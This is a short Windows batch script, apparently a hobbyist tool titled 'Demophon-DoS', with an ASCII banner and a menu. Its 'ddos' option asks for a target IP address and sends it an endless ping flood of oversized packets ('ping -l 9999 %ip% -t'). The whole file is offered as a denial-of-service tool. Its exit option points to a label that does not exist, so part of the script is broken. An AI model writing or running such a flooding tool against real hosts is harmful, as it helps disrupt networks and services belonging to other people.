@echo off
title Demophon-DoS - By vaxeron#0615
color a
echo ________                                   ______                         ________        ________
echo ___  __ \_____ _______ ___ ______ ________ ___  /_ ______ _______         ___  __ \______ __  ___/
echo __  / / /_  _ \__  __ `__ \_  __ \___  __ \__  __ \_  __ \__  __ \__________  / / /_  __ \_____ \ 
echo _  /_/ / /  __/_  / / / / // /_/ /__  /_/ /_  / / // /_/ /_  / / /_/_____/_  /_/ / / /_/ /____/ / 
echo /_____/  \___/ /_/ /_/ /_/ \____/ _  .___/ /_/ /_/ \____/ /_/ /_/         /_____/  \____/ /____/  
echo                                   /_/                                                             
echo press any key to continue. . .
pause > nul
:dos
cls
echo.
echo -------------------
echo use tool [1]
echo exit [2]
echo -------------------
echo.
set /p numb= Enter your choice:

if %numb%==1 goto ddos
if %numb%==2 goto main

:ddos
cls
set /p ip= Enter IP address:

ping  -l 9999 %ip% -t